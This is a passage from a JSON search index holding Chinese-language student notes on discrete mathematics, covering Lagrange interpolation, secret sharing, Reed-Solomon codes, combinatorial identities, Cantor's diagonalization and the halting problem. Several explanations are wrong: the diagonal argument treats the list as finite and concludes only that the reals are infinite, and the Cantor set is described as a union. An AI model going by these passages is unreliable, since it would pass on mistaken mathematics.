<p>\u591a\u9879\u5f0f\u63d2\u503c\u662f\u4e00\u79cd\u6570\u5b66\u65b9\u6cd5\uff0c\u5b83\u901a\u8fc7\u4e00\u7cfb\u5217\u7684\u70b9\u96c6\u6765\u6784\u9020\u4e00\u4e2a\u591a\u9879\u5f0f\u51fd\u6570\uff0c\u4f7f\u5f97\u8fd9\u4e2a\u591a\u9879\u5f0f\u7cbe\u786e\u5730\u901a\u8fc7\u6bcf\u4e00\u4e2a\u7ed9\u5b9a\u7684\u70b9\u3002\u8fd9\u79cd\u65b9\u6cd5\u5728\u6570\u5b66\u3001\u5de5\u7a0b\u3001\u7269\u7406\u548c\u8ba1\u7b97\u673a\u79d1\u5b66\u7b49\u9886\u57df\u975e\u5e38\u6709\u7528\uff0c\u7279\u522b\u662f\u5728\u53ea\u6709\u6709\u9650\u6570\u91cf\u7684\u70b9\u53ef\u7528\u65f6\uff0c\u7528\u4e8e\u8fd1\u4f3c\u672a\u77e5\u51fd\u6570</p> <p>\u591a\u9879\u5f0f\u63d2\u503c\u5176\u5b9e\u6211\u4eec\u5f88\u4e45\u4e4b\u524d\u5c31\u63a5\u89e6\u8fc7\uff0c\u6700\u7b80\u5355\u7684\u4e00\u4e2a\u591a\u9879\u5f0f\u63d2\u503c\u5c31\u662f\u66f4\u5177\u4e24\u70b9\u5750\u6807\u786e\u5b9a\u4e00\u6761\u76f4\u7ebf\u65b9\u7a0b\u3002</p> <p>\u6700\u7b80\u5355\u7684\u591a\u9879\u5f0f\u63d2\u503c\u662f\u7ebf\u6027\u63d2\u503c\uff0c\u5b83\u901a\u8fc7\u4e24\u4e2a\u70b9\u62df\u5408\u4e00\u6761\u76f4\u7ebf\u3002\u4f46\u662f\uff0c\u5f53\u7ed9\u51fa\u4e24\u4e2a\u4ee5\u4e0a\u7684\u70b9\u65f6\uff0c\u5c31\u9700\u8981\u66f4\u9ad8\u9636\u7684\u591a\u9879\u5f0f\u6765\u63d2\u503c\u6240\u6709\u70b9\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/08-Polynomials/#ii1-lagrange-polynomials","title":"II.1 Lagrange Polynomials","text":"<p>\u6700\u5e38\u89c1\u7684\u591a\u9879\u5f0f\u63d2\u503c\u5f62\u5f0f\u662f \u62c9\u683c\u6717\u65e5\u591a\u9879\u5f0f \uff0c\u5b83\u662f\u4e00\u4e2a\u4e0d\u8d85\u8fc7 n \u9636\u7684\u591a\u9879\u5f0f\uff0c\u53ef\u4ee5\u7cbe\u786e\u901a\u8fc7 n+1\u4e2a\u70b9\u3002\u5bf9\u4e8e\u70b9\u96c6(x_0, y_0), (x_1, y_1), \u2026, (x_n, y_n)\uff0c\u62c9\u683c\u6717\u65e5\u591a\u9879\u5f0f L(x)\u5b9a\u4e49\u4e3a\uff1a</p> <p>\\(L(x) = y_0 * l_0(x) + y_1 * l_1(x) + \u2026 + y_n * l_n(x)\\)</p> <p>\u5176\u4e2d \\(l_i(x)\\) \u662f \u62c9\u683c\u6717\u65e5\u57fa\u591a\u9879\u5f0f\uff1a</p> \\[l_i(x) = (x - x_0) / (x_i - x_0) * \u2026 * (x - x_{i-1}) / (x_i - x_{i-1}) * (x - x_{i+1}) / (x_i - x_{i+1}) * \u2026 * (x - x_n) / (x_i - x_n) = \\alpha \\] <p>\u4ea6\u5373 \\(\\frac{\\prod_{j \\neq i} x\u2212x_{j}}{\\prod_{j\\neq i} (x_{i} \u2212x_{j})}\\) \u3002\u62c9\u683c\u6717\u65e5\u57fa\u591a\u9879\u5f0f\u5177\u6709\u6027\u8d28 \\(\\begin{cases}l_i(x_j) = 1\\quad \u5f53i = j \\\\ l_i(x_j) = 0\\quad \u5f53i \u2260 j\\end{cases}\\) \uff0c\u8fd9\u786e\u4fdd\u4e86 L(x)\u7cbe\u786e\u901a\u8fc7\u6240\u6709\u7ed9\u5b9a\u7684\u70b9\uff08\u5728\u7ebf\u6027\u4ee3\u6570\u4e2d\u6211\u4eec\u6709\u6240\u6d89\u53ca\uff09\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/08-Polynomials/#ii2-linear-algebra","title":"II.2 linear-algebra","text":"<p>\u4e0d\u96be\u53d1\u73b0\u8fd9\u4e0d\u5c31\u662f\u6211\u4eec\u89e3\u7ebf\u6027\u65b9\u7a0b\u7ec4\u561b\uff0c\u7ebf\u6027\u4ee3\u6570\u4e2d\u8bb2\u89e3\u5f88\u591a\uff0c\u4e0d\u518d\u8d58\u8ff0\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/08-Polynomials/#iii-application","title":"III Application","text":"<p>Question</p> <p>\u67d0\u7ec4\u7ec7\u5c06\u673a\u5bc6\u6587\u4ef6\u653e\u5165\u5bc6\u7801\u7bb1\u4e2d\u5e76\u89c4\u5b9a\uff1a</p> <ul> <li> <p>\u53ea\u6709 n \u4e2a\u4eba\u638c\u63e1\u4e86\u5173\u4e8e\u5bc6\u7801\u7684\u4fe1\u606f</p> </li> <li> <p>\u5f53\u6c47\u96c6\u4efb\u610f k (&lt;= n) \u4e2a\u4eba\u7684\u4fe1\u606f\u65f6\u4e00\u5b9a\u80fd\u591f\u83b7\u5f97\u51c6\u786e\u7684\u5bc6\u7801</p> </li> <li> <p>\u5f53\u6c47\u96c6\u4efb\u610f\u5c11\u4e8e k \u4e2a\u4eba\u7684\u4fe1\u606f\u65f6\u4e00\u5b9a\u4e0d\u80fd\u591f\u83b7\u5f97\u51c6\u786e\u7684\u5bc6\u7801</p> </li> </ul> <p>\u5982\u4f55\u5b9e\u73b0\uff1f</p> <p>\u4e00\u4e2a\u5f88\u597d\u7684\u529e\u6cd5\u5c31\u662f\uff1a\u5229\u7528 \u591a\u9879\u5f0f \u6211\u4eec\u5148\u968f\u673a\u9009\u53d6\u4e00\u4e2a k-1 \u6b21\u591a\u9879\u5f0f\uff0c\u4ece\u5176\u4e0a\u6311\u9009 n \u4e2a\u4e92\u4e0d\u76f8\u540c\u7684\u70b9\u7684\u5750\u6807\u4f5c\u4e3a\u4fe1\u606f\u5206\u53d1\u7ed9 n \u4e2a\u4eba\uff1b\u6211\u4eec\u77e5\u9053 k \u4e2a\u4eba\u7684\u4fe1\u606f\u4e00\u5b9a\u53ef\u4ee5\u786e\u5b9a\u8be5\u591a\u9879\u5f0f\uff0c\u800c k-1 \u4e2a\u4eba\u7684\u4fe1\u606f\u4e0d\u80fd\uff0c\u8fd9\u6837\u5c31\u8fbe\u5230\u4e86\u76ee\u7684\uff1b\u81f3\u4e8e\u5bc6\u7801\u7684\u5b58\u50a8\uff0c\u4e0d\u59a8\u4f5c\u4e3a\u67d0\u4e00\u7279\u5b9a\u6a2a\u5750\u6807\u7684\u7eb5\u5750\u6807\u5373\u53ef\uff1b\u4e00\u822c\u7684\uff0c\u6211\u4eec\u9009\u62e9 0 \u4f5c\u4e3a\u8fd9\u4e00\u7279\u5b9a\u6a2a\u5750\u6807\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff1a</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/09-Error_Correcting_Codes/","title":"09 Error Correcting Codes","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/09-Error_Correcting_Codes/#i-introduction","title":"I Introduction","text":"<p>Quote</p> <p>n\u00a0computing,\u00a0telecommunication,\u00a0information theory, and\u00a0coding theory,\u00a0forward error correction\u00a0(FEC) or\u00a0channel coding[1][2][3]\u00a0is a technique used for\u00a0controlling errors\u00a0in\u00a0data transmission\u00a0over unreliable or noisy\u00a0communication channels.</p> <p>The central idea is that the sender encodes the message in a\u00a0redundant\u00a0way, most often by using an\u00a0error correction code\u00a0or\u00a0error correcting code\u00a0(ECC \u7ea0\u9519\u7801). [[4]] (https://en.wikipedia.org/wiki/Error_correction_code#cite_note-4) [[5]] (https://en.wikipedia.org/wiki/Error_correction_code#cite_note-Hamming-5)\u00a0The redundancy allows the receiver not only to\u00a0detect errors\u00a0that may occur anywhere in the message, but often to correct a limited number of errors. Therefore a\u00a0reverse channel\u00a0to request re-transmission may not be needed. The cost is a fixed, higher forward channel bandwidth.</p> <p>When we work with numbers modulo a prime m, we say that we are working over a finite field , denoted by Fm or GF(m) (for Galois Field).</p> <p>\u6765\u81ea\u7ef4\u57fa\u767e\u79d1</p> <p>There are, very roughly speaking, (at least) two distinct flavors of error correcting codes: algebraic codes\uff08\u4ee3\u6570\u7801\uff09, which are based on polynomials over finite fields, and combinatorial codes\uff08\u7ec4\u5408\u7801\uff09, which are based on graph theory.</p> <p>In this note we will focus on algebraic codes, and in particular on so-called Reed-Solomon codes (named after two of their inventors).</p>","tags":["DMPT","notes"]},{"location":"note/cs70/09-Error_Correcting_Codes/#ii-some-kinds-of-errors","title":"II Some kinds of errors","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/09-Error_Correcting_Codes/#ii1-erasure-errors","title":"II.1 Erasure Errors\uff08\u64e6\u9664\u9519\u8bef\uff09","text":"<p>\u987e\u540d\u601d\u4e49\uff0c\u6570\u636e\u5305\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u90e8\u5206\u4e22\u5931\u4e86\uff0c\u6211\u4eec\u5982\u4f55\u5e94\u5bf9\uff1f</p> <p>\u6839\u636e\u4e0a\u4e00\u7bc7 note \u7684 application \u90e8\u5206\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed9\u51fa\u4e00\u4e2a\u89e3\u51b3\u65b9\u6cd5\uff1a</p> <p>\u6211\u4eec\u4f30\u8ba1\u6700\u5927\u4e22\u5305\u7387\uff08\u4e0d\u59a8\u8bbe\u4f20\u8f93 n+k \u4e2a\u5305\u65f6\u81f3\u591a\u4e22\u5931 k \u4e2a\u5305\uff09\uff0c\u518d\u76f8\u5e94\u5730\u989d\u5916\u53d1\u9001\u5305\uff0c\u4fdd\u8bc1\u5728\u4e22\u5305\u6700\u591a\u7684\u60c5\u51b5\u4e0b\u63a5\u6536\u65b9\uff08\u81f3\u5c11\u63a5\u6536\u5230\u4e86 n \u4e2a\u5305\uff09\u4f9d\u65e7\u80fd\u591f\u83b7\u5f97\u6b63\u786e\u4fe1\u606f\uff1b\u540c\u65f6\u4e00\u822c\u6570\u636e\u5305\u5177\u6709\u6807\u5934\uff0c\u4ee5\u4fbf\u63a5\u6536\u65b9\u77e5\u9053\u5177\u4f53\u4e22\u5931\u4e86\u90a3\u4e9b\u5305\uff08\u6682\u65f6\u5012\u662f\u7528\u4e0d\u4e0a\uff09\u3002</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/09-Error_Correcting_Codes/#ii2-general-errors","title":"II.2 General Errors","text":"<p>\u66f4\u4e3a\u68d8\u624b\u7684\u60c5\u51b5\u662f\uff0c\u5982\u679c\u6211\u4eec\u7684\u6570\u636e\u5305\u4e0d\u662f\u4e22\u5931\u4e86\uff0c\u800c\u662f\u88ab\u7be1\u6539\u4e86\uff08\u6216\u8005\u8bf4\u635f\u574f\u4e86\uff09\uff0c\u800c\u6211\u4eec\u5e76\u4e0d\u77e5\u9053\u54ea\u4e9b\u88ab\u4fee\u6539\u4e86\uff0c\u8be5\u5982\u4f55\u6062\u590d\u4fe1\u606f\u5462\uff1f</p> <p>\u540c\u6837\u5047\u8bbe\u6211\u4eec\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u81f3\u591a k \u4e2a\u5305\u4f1a\u88ab\u4fee\u6539\uff0c\u90a3\u4e48\u6211\u4eec\u9700\u8981\u989d\u5916\u4f20\u8f93\u7684\u5305\u7531 k \u4e2a\u53d8\u4e3a\u4e86 2k \u4e2a\uff0c\u4e5f\u5c31\u662f\u8bf4\u53d1\u9001\u65b9\u5e94\u53d1\u9001\u81f3\u5c11 n+2k \u4e2a\u5305\uff1b\u4e0b\u9762\u5c06\u8bf4\u660e\u5176\u53ef\u884c\u6027\uff1a</p> <p>Info</p> <p>error-locator polynomial : \\(E(X) = (x-e_{1})(x-e_{2})\\dots(x-e_{k})\\)</p> <p>\u8bbe\u5b58\u50a8\u4fe1\u606f\u7684\u591a\u9879\u5f0f\u4e3a P(X)\uff0c\u90a3\u4e48 P(i) \u5c31\u53ef\u4ee5\u5bf9\u5e94\u63a5\u6536\u65b9\u63a5\u6536\u5230\u7684\u4fe1\u606f</p> <p>\u6211\u4eec\u8bb0\uff1a Q(X) = P(X)E(X)\uff0c\u4e0d\u96be\u53d1\u73b0\uff0cE(X)\u7684\u6b21\u9879\u6700\u5927\u4e3a k\uff0cQ(X) \u7684\u6700\u5927\u4e3a n+k\uff0c\u4e0d\u59a8\u8bbe\uff1a</p> <p></p> <p>\u63a5\u6536\u65b9\u5c06 n+2 k \u7ec4\u6570\u636e\u5e26\u5165\u5176\u4e2d\uff0c\u4e0d\u96be\u53d1\u73b0\u5c31\u662f n+2 k \u5143\u7ebf\u6027\u65b9\u7a0b\u7ec4\uff01\u90a3\u4e48\u5f88\u597d\u7406\u89e3\u4e3a\u751a\u4e48 n+2 k \u662f\u4e00\u4e2a\u4e34\u754c\u503c\u4e86\uff1b\u5982\u4f55\u8bc1\u660e\u6211\u4eec\u89e3\u51fa\u6765\u7684 P(X)\u662f\u552f\u4e00\u7684\uff1f\u4e00\u4e2a\u529e\u6cd5\u662f\u770b\u7ebf\u6027\u65b9\u7a0b\u7ec4\u7684\u89e3\u662f\u5426\u552f\u4e00\uff0c\u6216\u8005\u5176\u89e3\u7a7a\u95f4\u662f\u5426\u5b58\u5728\u67d0\u79cd\u7279\u5f81\uff1f\u8fd9\u662f\u7ebf\u6027\u4ee3\u6570\u7684\u4e8b\u60c5\u4e86\uff0c\u6211\u4eec\u6309\u4e0b\u4e0d\u8868\u3002\u4e0b\u9762\u662f\u7b14\u8bb0\u4e2d\u7ed9\u51fa\u7684\u4f8b\u5b50\u3002</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/10-Counting/","title":"10 Counting","text":"<p>\u8fd9\u7bc7 note \u4e3b\u8981\u8bb2\u5173\u4e8e\u6392\u5217\u7ec4\u5408\u7684\u4e00\u4e9b\u5185\u5bb9\uff0c\u6211\u4eec\u5728\u9ad8\u4e2d\u5df2\u7ecf\u5b66\u4e60\u8fc7\u4e0d\u5c11\uff0c\u6240\u4ee5\u8bb2\u7684\u6bd4\u8f83\u7b80\u6d01\uff0c\u540c\u6837\u662f\u7f57\u5217\u4e00\u4e9b\u77e5\u8bc6\u70b9</p>","tags":["DMPT","notes"]},{"location":"note/cs70/10-Counting/#i","title":"I \u4e00\u4e9b\u7ec4\u5408\u6570\u516c\u5f0f","text":"<p>unnamed formula</p> <p>\uff08\u53ea\u662f\u6211\u4e0d\u60f3\u53bb\u67e5\u8fd9\u662f\u4ec0\u4e48\u516c\u5f0f\u7f62\u4e86\uff09</p> \\[ (^{n+1}_{r+1}) = (^{n}_{r})+(^{n}_{r+1}) \\] <p>\u4e0d\u96be\u7406\u89e3\uff0c\u5c31\u662f\u5c31 \u67d0\u4e00\u9879\u88ab\u9009\u4e0a\u4e0e\u5426 \u5206\u4e86\u4e24\u79cd\u60c5\u51b5\u3002</p> <p>Hockey-stick identity</p> \\[ (^{n+1}_{r+1}) = (^{n}_{r})+(^{n-1}_{r})+\\dots+(^{r+1}_{r})+(^{r}_{r}) \\] <p>\u4e4b\u6240\u4ee5\u53eb\u8fd9\u4e2a\u540d\u5b57\u662f\u56e0\u4e3a\u5176\u5728\u6768\u8f89\u4e09\u89d2\uff08\u5916\u56fd\u4e00\u822c\u79f0\u4e3a Pascal's triangle \uff09\u4e2d\u7684\u5f62\u72b6\u5341\u5206\u50cf\u4e00\u4e2a\u66f2\u68cd\u7403\u68d2</p> <p></p> <p>\u4e0d\u96be\u7406\u89e3\uff0c\u4e0a\u9762\u7684\u516c\u5f0f\u53ef\u4ee5\u7406\u89e3\u4e3a\uff1a</p> <p>\u4ece n -1 \u4e2a\u4e2d\u9009\u62e9 r+1 \u4e2a\u7b49\u540c\u4e8e</p> <ul> <li>\u9009\u62e9\u7b2c n+1 \u4e2a\uff0c\u4ece\u5269\u4e0b\u7684 n \u4e2a\u4e2d\u9009\u62e9 r \u4e2a</li> <li>\u4e0d\u9009 n + 1 \u9009 n\uff0c\u4ece\u5269\u4e0b\u7684 n-1 \u4e2a\u4e2d\u9009 r \u4e2a</li> <li>\u2026\u2026 </li> <li>\u4e0d\u9009\u540e\u9762\u7684\u9009 r+1\uff0c\u4ece\u5269\u4e0b r \u4e2a\u4e2d\u9009\u62e9 r \u4e2a</li> </ul> <p>\u5c06\u4e0a\u9762\u6240\u6709\u52a0\u8d77\u6765\u4fbf\u5f97\u8bc1</p> <p>Derangement</p> <p>[!DEFINITION 10.1]</p> <p>In\u00a0combinatorial mathematics, a\u00a0derangement\uff08\u7d0a\u4e71\uff09\u00a0is a\u00a0permutation\u00a0of the elements of a\u00a0set\u00a0in which  no element appears in its original position . In other words, a derangement is a permutation that has no\u00a0fixed points.</p> <p>\u56de\u5fc6\u4e00\u4e0b\uff0c\u9ad8\u4e2d\u6216\u8bb8\u89c1\u8fc7\u8fd9\u6837\u7684\u9898\u76ee\uff1an \u4e2a\u4eba\u4e92\u76f8\u9001\u793c\u7269\uff0c\u6bcf\u4eba\u9001\u4e00\u4efd\u4e14\u5f97\u4e00\u4efd\uff0c\u4e0d\u5f97\u62ff\u81ea\u5df1\u7684\u793c\u7269\uff0c\u95ee\u6709\u591a\u5c11\u79cd\u9001\u7684\u65b9\u6cd5\uff1f\uff08\u8bb0\u4f5c D(n) \uff09\u5c31\u662f\u8fd9\u4e2a\u4e86\uff0c\u6211\u4e2a\u4eba\u613f\u610f\u628a\u8fd9\u4e2a\u79f0\u4e3a\u9519\u4f4d\u6392\u5e8f\uff0c\u7b80\u79f0\u9519\u6392\u3002</p> <p>\u4e0d\u52a0\u8bc1\u660e\u5730\uff0c\u6211\u4eec\u7ed9\u51fa\uff1a</p> \\[ D_{n}=\\begin{cases} 0\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad n=1\\\\ 1\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad\\quad n=2 \\\\ (n-1)(D_{n-1}+D_{n-2})\\quad n\\geq 3 \\end{cases}\\quad\\quad =\\quad n!\\sum_{k=0}^{n}\\frac{(-1)^{k}}{k!} \\]","tags":["DMPT","notes"]},{"location":"note/cs70/11-Countability/","title":"11 Countability","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/11-Countability/#i-cantors-diagonalization","title":"I Cantor\u2019s Diagonalization","text":"<p>Note</p> <p>Cardinality\uff08\u57fa\u6570\u6216\u52bf\uff09 \u5373\u96c6\u5408\u4e2d\u5143\u7d20\u7684\u4e2a\u6570</p> <p>\u683c\u5965\u5c14\u683c\u00b7\u5eb7\u6258\u5c14\uff08Georg Cantor\uff09\u662f\u7b2c\u4e00\u4e2a\u7cfb\u7edf\u5730\u7814\u7a76\u65e0\u7a77\u7684\u6570\u5b66\u5bb6\uff0c\u4ed6\u63d0\u51fa\u4e86\u65e0\u7a77\u96c6\u5408\u4e4b\u95f4\u53ef\u4ee5\u6709\u4e0d\u540c\u7684\u52bf\uff0c\u5373\u5b58\u5728\u4e0d\u540c\u201c\u7b49\u7ea7\u201d\u7684\u65e0\u7a77\u3002</p> <p>\u5eb7\u6258\u5c14\u7684\u5bf9\u89d2\u5316\u65b9\u6cd5\uff0c\u4e5f\u79f0\u4e3a\u5bf9\u89d2\u7ebf\u8bba\u8bc1\u6cd5\uff0c\u5b83\u4e3b\u8981\u7528\u4e8e\u8bc1\u660e\u5b9e\u6570\u96c6\u662f\u4e0d\u53ef\u6570\u7684\uff0c\u8fd9\u662f\u5eb7\u6258\u5c14\u5173\u4e8e\u65e0\u7a77\u96c6\u5408\u7406\u8bba\u7684\u4e00\u4e2a\u91cd\u8981\u8d21\u732e\u3002\u5bf9\u89d2\u5316\u65b9\u6cd5\u4e5f\u88ab\u7528\u4e8e\u5176\u4ed6\u6570\u5b66\u8bc1\u660e\uff0c\u7279\u522b\u662f\u5728\u8bc1\u660e\u67d0\u4e9b\u96c6\u5408\u7684\u65e0\u9650\u6027\u8d28\u65f6\u3002</p> <p>\u5eb7\u6258\u5c14\u7684\u5bf9\u89d2\u7ebf\u8bba\u8bc1\u6cd5\u7684\u57fa\u672c\u601d\u60f3\u662f\u901a\u8fc7\u6784\u9020\u4e00\u4e2a\u4e0d\u53ef\u80fd\u5728\u7ed9\u5b9a\u5217\u8868\u4e2d\u7684\u5143\u7d20\u6765\u8bc1\u660e\u4e00\u4e2a\u96c6\u5408\u7684\u57fa\u6570\u5927\u4e8e\u6216\u5c0f\u4e8e\u53e6\u4e00\u4e2a\u96c6\u5408\u3002\u8fd9\u4e2a\u65b9\u6cd5\u6700\u8457\u540d\u7684\u5e94\u7528\u662f\u8bc1\u660e\u5b9e\u6570\u96c6\u662f\u4e0d\u53ef\u6570\u7684\uff0c\uff08\u5176\u5b9e\u4e5f\u8bc1\u660e\u4e86\u5b9e\u6570\u96c6\u7684\u57fa\u6570\u5927\u4e8e\u81ea\u7136\u6570\u96c6\u7684\u57fa\u6570\uff09\u4e0b\u9762\u662f\u5176\u63a8\u5bfc\u8fc7\u7a0b\uff1a</p> <p>\u5047\u8bbe\u6709\u4eba\u58f0\u79f0\u4ed6\u4eec\u5df2\u7ecf\u5217\u51fa\u4e86\u6240\u6709\u7684\u5b9e\u6570\uff0c\u6211\u4eec\u5c06\u8fd9\u4e9b\u5b9e\u6570\u8868\u793a\u4e3a\u4e00\u4e2a\u65e0\u9650\u77e9\u9635\uff0c\u5176\u4e2d\u6bcf\u4e00\u884c\u4ee3\u8868\u4e00\u4e2a\u5b9e\u6570\u7684\u65e0\u9650\u5c0f\u6570\u5c55\u5f00\uff0c\u4f46\u662f\u884c\u6570\u662f\u6709\u9650\u7684\uff0c\u4f8b\u5982\uff1a</p> <p>0.123456789...</p> <p>0.987654321...</p> <p>0.333333333...</p> <p>0.141592653...</p> <p>0.123456789...</p> <p>0.987654321...</p> <p>0.333333333...</p> <p>\u22ee\u200b</p> <p>0.141592653...</p> <p>\u8003\u8651\u6784\u5efa\u4e00\u4e2a\u65b0\u7684\u6570 x\uff0c\u5b83\u662f\u8fd9\u6837\u83b7\u5f97\u7684\uff1a\u4ee5\u5c0f\u6570\u70b9\u5f00\u59cb\u4e3a\u4f8b\uff0c\u53d6\u7b2c\u4e00\u4e2a\u6570\u7684\u7b2c\u4e00\u4f4d\u5c0f\u6570\u52a0 k\uff08 k != 9 \u4e14 k!= 0 \u5373\u53ef\uff1b\u4e0d\u59a8\u4ee4 k = 1\uff09\u540e\u5bf9 9 \u53d6\u6a21\u4f5c\u4e3a x \u7684\u7b2c\u4e00\u4f4d\u5c0f\u6570\uff1b\u53d6\u7b2c\u4e8c\u4e2a\u6570\u7684\u7b2c\u4e8c\u4f4d\u5c0f\u6570\u2026\u2026\u7531\u4e8e\u5b9e\u6570\u201c\u6709\u9650\u201d\uff0c\u6211\u4eec\u603b\u80fd\u6784\u9020\u51fa x \u4e0e\u6240\u63d0\u51fa\u7684\u4efb\u4f55\u6709\u9650\u4e2a\u5b9e\u6570\u5747\u4e0d\u540c\uff08\u6bd5\u7adf\u4e0e\u6bcf\u4e00\u4e2a\u6570\u90fd\u81f3\u5c11\u6709\u4e00\u4f4d\u5c0f\u6570\u4e0d\u540c\uff09\uff0c\u8bf4\u660e\u65e0\u6cd5\u7ed9\u51fa\u4e00\u4e2a\u6709\u9650\u96c6\u5408\u5305\u62ec\u6240\u6709\u5b9e\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\u5b9e\u6570\u96c6\u662f\u65e0\u9650\u96c6\u5408\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/11-Countability/#ii-cantor-set","title":"II Cantor set","text":"<p>[!DEFINITION ]</p> <p>The Cantor set is a remarkable set construction involving the real numbers in the interval [0,1]. The set is defined by repeatedly removing the middle thirds of line segments infinitely many times, starting with the original interval.</p> <p></p> <p>\u7b80\u800c\u8a00\u4e4b\uff0c\u5c31\u662f\u5c06 [0, 1] \u8fd9\u4e00\u95ed\u533a\u95f4\u6bcf\u6b21\u79fb\u51fa\u4e2d\u95f4\u7684 1/3 \u957f\u5ea6\uff0c\u4ea7\u751f\u4e24\u4e2a\u96c6\u5408\uff0c\u4ed6\u4eec\u7684\u957f\u5ea6\u539f\u96c6\u5408\u7684 1/3\uff1b\u65e0\u6570\u6b21\u5730\u5206\u4e0b\u53bb\uff0c\u5c06\u5f97\u5230\u65e0\u6570\u4e2a\u96c6\u5408\uff0c\u8fd9\u4e9b\u96c6\u5408\u53d6\u5e76\u96c6\u5c31\u662f\u5eb7\u6258\u5c14\u96c6\u5408\uff1b\u8fd9\u540c\u6837\u8bc1\u660e\u4e86 [0, 1] \u4e4b\u95f4\u7684\u5b9e\u6570\u6709\u65e0\u7a77\u591a\u4e2a\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u5728\u5eb7\u6258\u5c14\u4e4b\u524d\uff0c\u4eba\u4eec\u5f80\u5f80\u5c06\u65e0\u9650\u96c6\u5408\u7684\u57fa\u6570\u8ba4\u4e3a\u662f\u76f8\u540c\u7684\uff0c\u4f46\u662f\u5eb7\u6258\u5c14\u5c06\u65e0\u9650\u5212\u5206\u4e86\u7b49\u7ea7\uff0c\u5176\u4e2d\u6700\u4f4e\u7ea7\u4e3a\u4e0e\u6574\u6570\u96c6/\u81ea\u7136\u6570\u96c6\u540c\u7ea7\u7684\u96c6\u5408\uff08\u5c31\u50cf\u6781\u9650\u79cd\u65e0\u7a77\u5c0f\u540c\u6837\u5206\u9ad8\u9636\u65e0\u7a77\u5c0f\uff0c\u7b49\u4ef7\u65e0\u7a77\u4e0b\u7b49\u7b49\uff09\uff0c\u6709\u5174\u8da3\u53ef\u4ee5\u81ea\u884c\u4e86\u89e3\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/12-Self_Reference_and_Computability/","title":"12 Self Reference and Computability","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/12-Self_Reference_and_Computability/#i-self-reference","title":"I Self-Reference","text":"<p>\u56de\u60f3\u4e00\u4e0b\u4f60\u662f\u5426\u66fe\u5199\u8fc7\u8fd9\u6837\u7684\u7a0b\u5e8f\uff08\u4ee5 C \u8bed\u8a00\u4e3a\u4f8b\uff09\uff1a</p> <pre><code>void function(){\n  ...A\n  functiong();\n  ...B\n}\n</code></pre> <p>\u65e0\u7591\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u5982\u679c\u4e0d\u80fd\u5728 A \u4e2d\u7ec8\u6b62\u7684\u8bdd\u5c06\u65e0\u6b62\u5883\u5730\u8fd0\u884c\u4e0b\u53bb\uff0c\u9664\u975e\u6709\u4ec0\u4e48\u5f3a\u884c\u7ec8\u6b62\u4e86\u5b83\uff1b\u539f\u56e0\u5f88\u7b80\u5355\uff0c\u5b83\u81ea\u5df1\u8c03\u7528\u4e86\u81ea\u5df1\u3002</p> <p>\u5728\u6211\u4eec\u63a8\u7406\u7684\u65f6\u5019\u4e5f\u662f\u5982\u6b64\uff0c\u5982\u679c\u7ed9\u51fa\u7684\u547d\u9898\u5f15\u7528\u4e86\u81ea\u5df1(self-reference)\uff0c\u90a3\u4e48\u5f88\u53ef\u80fd\u5f62\u6210\u6096\u8bba(Paradox)\uff0c\u4e00\u4e2a\u5f88\u7b80\u5355\u7684\u4f8b\u5b50</p> <p>\u201c\u8fd9\u53e5\u8bdd\u662f\u5047\u7684\u201d</p>","tags":["DMPT","notes"]},{"location":"note/cs70/12-Self_Reference_and_Computability/#i1-quines-and-the-recursion-theorem","title":"I.1 Quines and the Recursion Theorem","text":"<p>\u540c\u6837\u5730\u6211\u4eec\u7ed9\u51fa\u4e0b\u9762\u7684\u4f2a\u4ee3\u7801\uff0c\u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a\u51fd\u6570 <code>Quine</code> \u5e76\u4f20\u5165\u53c2\u6570 <code>s</code> \uff0c\u6267\u884c\u5185\u5bb9\u4e3a\u5b9a\u4e49\u51fd\u6570 <code>s</code> \u5e76\u4f20\u5165\u53c2\u6570 <code>s</code> \uff1b\u4e0d\u96be\u53d1\u73b0\u6267\u884c\u5185\u5bb9\u4f1a\u65e0\u6b62\u5883\u5730\u6267\u884c\u4e0b\u53bb</p> <pre><code>(Quine, \"s\"):\n    (s, \"s\")\n</code></pre>","tags":["DMPT","notes"]},{"location":"note/cs70/12-Self_Reference_and_Computability/#i2-the-halting-problem","title":"I.2 The Halting Problem","text":"<p>note \u4e2d\u8bb2\u89e3\u7684\u4e0d\u592a\u597d\u7406\u89e3\uff0c\u5148\u7528 GPT \u7684\u56de\u7b54\u653e\u5728\u8fd9\uff0c\u6253\u7b97\u540e\u9762\u7cfb\u7edf\u5b66\u4e60\u56fe\u7075\u673a\u7b49\u7b49\u518d\u6765\u7406\u89e3\u3002</p> <p>\u505c\u673a\u95ee\u9898\uff08The Halting Problem\uff09\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u548c\u6570\u5b66\u4e2d\u7684\u4e00\u4e2a\u8457\u540d\u95ee\u9898\uff0c\u7279\u522b\u662f\u5728\u7406\u8bba\u8ba1\u7b97\u673a\u79d1\u5b66\u548c\u9012\u5f52\u7406\u8bba\u4e2d\u3002\u5b83\u662f\u7531\u963f\u5170\u00b7\u56fe\u7075\uff08Alan Turing\uff09\u57281936\u5e74\u9996\u6b21\u63d0\u51fa\u7684\uff0c\u662f\u51b3\u5b9a\u7406\u8bba\u4e2d\u7684\u4e00\u4e2a\u5178\u578b\u4f8b\u5b50\uff0c\u8868\u660e\u6709\u4e9b\u95ee\u9898\u662f\u4e0d\u53ef\u80fd\u89e3\u51b3\u7684\u3002</p> 